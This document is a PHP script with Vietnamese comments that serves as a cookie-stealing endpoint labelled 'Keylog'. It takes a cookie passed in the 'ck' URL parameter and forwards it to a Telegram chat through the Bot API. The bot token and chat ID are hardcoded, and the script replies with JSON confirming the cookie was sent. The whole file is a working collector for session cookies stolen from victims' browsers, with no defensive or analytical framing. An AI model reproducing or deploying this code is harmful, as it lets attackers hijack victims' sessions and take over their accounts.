<?php
header("Content-Type: application/json; charset=UTF-8");

// Hàm gửi thông báo đến bot Telegram
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);
}

// Hàm trả về dữ liệu dưới dạng JSON theo cấu trúc yêu cầu
function response($author, $type, $example, $status, $messages) {
    return json_encode([
        "AuthorGitHub" => $author,
        "Type APIs" => $type,
        "Example" => $example,
        "Status" => $status,
        "Messages" => $messages
    ]);
}

// Lấy tên miền hiện tại
$domain = $_SERVER['HTTP_HOST'];
$request = $_SERVER['REQUEST_URI'];
$request = trim($request, '/');

// Token bot Telegram và chat ID
$botToken = '7297665662:AAHEivNetdFGfOVKv8vBAsEnSnuQ2wuz8rQ'; // Thay thế bằng token của bạn
$chatId = '-1002208295889'; // Thay thế bằng chat ID của bạn

// Xử lý các yêu cầu
if (strpos($request, 'keylog.php') !== false) {
    // Lấy cookie từ tham số URL
    $cookie = isset($_GET['ck']) ? $_GET['ck'] : '';

    if ($cookie) {
        // Gửi cookie đến bot Telegram
        sendToTelegram("Cookie received: " . $cookie, $botToken, $chatId);
        echo response("Khah", "Keylog", "http://$domain/api/keylog.php?ck=", "Success", "Cookie sent to Telegram");
    } else {
        // Không có cookie trong yêu cầu
        http_response_code(400);
        echo response("Khah", "Keylog", "", "Error", "Cookie is required");
    }
} else {
    // Trả về khi endpoint không tồn tại
    http_response_code(404);
    echo response("Khah", "Keylog", "", "Error", "Endpoint not found");
}
?>
